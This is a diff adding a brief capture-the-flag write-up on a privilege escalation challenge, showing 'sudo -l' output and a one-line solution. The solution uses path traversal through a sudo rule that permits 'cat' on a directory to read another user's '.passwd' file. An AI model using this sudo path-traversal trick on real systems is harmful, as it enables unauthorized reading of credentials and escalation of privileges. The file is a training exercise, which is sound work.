@@ -1,0 +1,15 @@
+Privilege escalation
+Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...
+
+sudo -l
+[sudo] password for app-script-ch1: app-script-ch1
+Matching Defaults entries for app-script-ch1 on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user
+
+User app-script-ch1 may run the following commands on this host:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/
+
+# Solution
+sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
